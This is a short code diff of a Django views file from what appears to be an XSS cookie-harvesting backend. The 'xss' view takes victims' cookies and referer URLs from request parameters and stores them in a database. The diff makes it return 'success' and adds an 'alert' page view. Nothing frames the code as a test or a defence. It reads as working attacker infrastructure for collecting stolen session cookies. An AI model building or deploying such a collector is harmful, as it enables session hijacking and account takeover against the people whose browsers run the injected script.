@@ -42,4 +42,8 @@ def xss(request):
     cookies = request.GET.get('cookies', '')
     referer = request.GET.get('referer', '')
     XSS.objects.create(cookies=cookies, referer=referer)
-    return
+    return HttpResponse('success')
+
+
+def alert(request):
+    return render(request, 'alert.html', {})
